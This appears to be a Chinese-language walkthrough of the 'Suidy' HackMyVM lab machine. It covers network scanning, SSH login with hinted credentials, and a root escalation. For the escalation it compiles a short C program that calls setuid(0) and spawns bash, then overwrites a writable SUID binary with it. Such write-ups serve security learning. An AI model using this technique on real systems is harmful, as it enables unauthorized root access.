# Suidy

> Easy

> 2024-08-29

> 主机 IP: 192.168.1.81

> 靶场 IP: 192.168.1.79

```terminal
$ arp-scan -l -I eth0
192.168.1.79    08:00:27:a3:e6:ad       PCS Systemtechnik GmbH

$ nmap -A -p- 192.168.1.79
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 8a:cb:7e:8a:72:82:84:9a:11:43:61:15:c1:e6:32:0b (RSA)
|   256 7a:0e:b6:dd:8f:ee:a7:70:d9:b1:b5:6e:44:8f:c0:49 (ECDSA)
|_  256 80:18:e6:c7:01:0e:c6:6d:7d:f4:d2:9f:c9:d0:6f:4c (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.14.2

$ dirsearch -u http://192.168.1.79/
[...] 200 -  362B  - /robots.txt
```

访问 `http://192.168.1.79/robots.txt`

```txt
/hi
/....\..\.-\--.\.-\..\-.
/shehatesme
```

访问 `http://192.168.1.79/shehatesme/`

```txt
She hates me because I FOUND THE REAL SECRET! I put in this directory a lot of .txt files. ONE of .txt files contains credentials like "theuser/thepass" to access to her system! All that you need is an small dict from Seclist!
```

成功用 `theuser/thepass` 进行 ssh 连接

```bash
$ ssh theuser@192.168.1.79

...

$ theuser@suidy:~$ ls
user.txt

$ theuser@suidy:~$ cat user.txt
HMV2353IVI
```

到 home 目录下，还有个用户 suidy

```terminal
$ theuser@suidy:/home/suidy$ ls -al
total 52
drwxr-xr-x 3 suidy suidy    4096 sep 27  2020 .
drwxr-xr-x 4 root  root     4096 sep 26  2020 ..
-rw------- 1 suidy suidy      12 sep 27  2020 .bash_history
-rw-r--r-- 1 suidy suidy     220 sep 26  2020 .bash_logout
-rw-r--r-- 1 suidy suidy    3526 sep 26  2020 .bashrc
drwxr-xr-x 3 suidy suidy    4096 sep 26  2020 .local
-r--r----- 1 suidy suidy     197 sep 26  2020 note.txt
-rw-r--r-- 1 suidy suidy     807 sep 26  2020 .profile
-rwsrwsr-x 1 root  theuser 16704 sep 26  2020 suidyyyyy

$ theuser@suidy:/home/suidy$ cat note.txt
cat: note.txt: Permiso denegado

$ theuser@suidy:/home/suidy$ ./suidyyyyy

$ suidy@suidy:/home/suidy$
```

执行 /home/suidy/suidyyyyy 后切回用户 suidy，看 note.txt

```terminal
$ suidy@suidy:/home/suidy$ cat note.txt
I love SUID files!
The best file is suidyyyyy because users can use it to feel as I feel.
root know it and run an script to be sure that my file has SUID.
If you are "theuser" I hate you!

-suidy
```

考虑用 suidyyyyy 提权，在/tmp 下编写编译代码 1.c

```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

int main()
{
    setuid(0);
    setgid(0);
    system("/bin/bash");
}
```

编译后覆盖 suidyyyyy

```terminal
$ theuser@suidy:/tmp$ gcc 1.c -o suidyyyyy
$ theuser@suidy:/tmp$ cp suidyyyyy /home/suidy/suidyyyyy
$ theuser@suidy:/tmp$ cd /home/suidy/
$ theuser@suidy:/tmp$ ./suidyyyyy

...

HMV0000EVE
```
